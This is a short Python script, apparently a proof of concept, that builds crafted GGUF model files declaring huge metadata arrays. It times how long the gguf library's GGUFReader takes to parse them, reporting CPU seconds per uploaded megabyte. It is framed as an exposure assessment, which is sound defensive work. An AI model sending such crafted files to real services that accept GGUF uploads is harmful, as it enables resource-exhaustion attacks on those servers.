#!/usr/bin/env python3
"""How bad is it? Measure parse cost against file size.

An exposure assessment that says "this is slow" is not actionable. What a product
team needs is the shape of the curve: does an attacker pay proportionally for the
damage they cause, or do they get leverage?
"""
import struct, time, tempfile, os, sys

def build(count, pad):
    buf = b"GGUF" + struct.pack("<IQQ", 3, 0, 1)
    buf += struct.pack("<Q", 1) + b"a"
    buf += struct.pack("<I", 9) + struct.pack("<I", 12) + struct.pack("<Q", count)
    return buf + b"\x00" * pad

def timed(count, pad):
    data = build(count, pad)
    with tempfile.NamedTemporaryFile(suffix=".gguf", delete=False) as t:
        t.write(data); path = t.name
    try:
        from gguf.gguf_reader import GGUFReader
        s = time.time()
        try: GGUFReader(path)
        except Exception: pass
        return len(data), time.time() - s
    finally:
        os.unlink(path)

print(f"{'upload size':>14}  {'declared elems':>15}  {'parse time':>11}  {'ratio':>10}")
print("-" * 58)
for count, pad in [(250_000, 260_008), (1_000_000, 1_040_008),
                   (2_500_000, 2_600_008), (5_000_000, 5_200_008)]:
    size, t = timed(count, pad)
    # seconds of server CPU bought per megabyte the attacker uploads
    ratio = t / (size / 1_048_576)
    print(f"{size:>14,}  {count:>15,}  {t:>10.2f}s  {ratio:>8.2f} s/MB")
